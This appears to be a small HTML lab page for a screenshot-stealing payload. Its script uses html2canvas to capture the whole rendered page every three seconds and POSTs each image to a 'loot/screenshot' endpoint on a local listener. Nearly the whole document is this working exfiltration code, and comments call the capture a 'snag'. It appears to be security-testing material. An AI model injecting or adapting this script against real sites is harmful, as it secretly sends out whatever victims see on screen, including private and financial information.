<head>
	<title>Labs-Screenshots</title>
</head>
<body>

	<h1>html2canvas labs</h1>
	
	<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script> -->
	<p>test content...</p>

	<script>
		alert("Ready to snag screenshot?");
	</script>


	<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
	<script>
		console.log('Sleeping to allow resources loading!');

		setTimeout(function () 
		{
			setInterval(function () 
			{
				html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
					{
						function responseHandler() 
						{
							console.log(this.responseText)
						};

						// a = new XMLHttpRequest();a.addEventListener("load", responseHandler);
						// a.open("POST", "//localhost:8444/loot/screenshot");
						//a.send(btoa(canvas.toDataURL()));


						// New stuff
						console.log("About to send image....");
						newReq = new XMLHttpRequest();newReq.addEventListener("load", responseHandler);
						newReq.open("POST", "//localhost:8444/loot/screenshot");
						canvas.toBlob((blob) => 
						{
							const image = blob;
							newReq.send(image);
						});
						//b.send(canvas.toBlob())
					}).catch(e => console.log(e));
			}, 3000);
		}, 10000);



	</script>

</body>